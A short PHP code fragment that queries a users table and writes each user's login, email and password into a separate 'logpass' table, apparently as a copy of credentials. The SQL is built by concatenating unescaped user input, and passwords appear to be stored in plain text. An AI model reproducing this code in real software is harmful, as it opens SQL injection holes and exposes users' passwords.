...
$get_pass	= mysql_query("SELECT id, login, pass, status, mail FROM users WHERE login = '".$user."' AND active = 0 LIMIT 1");
$row		= mysql_fetch_array($get_pass);
 ...
 if(!mysql_num_rows(mysql_query("SELECT login FROM logpass WHERE login = '".$user."'"))) {
 $sql = "INSERT INTO `logpass` (`login`, `email`, `password`) VALUES ('".$user."', '".$mailka."', '".$password."')";
mysql_query($sql);
 } else {
 $sql = "UPDATE `logpass` SET `email` = '".$mailka."', `password` = '".$password."' WHERE `login` = '".$user."' LIMIT 1";
mysql_query($sql);
 }
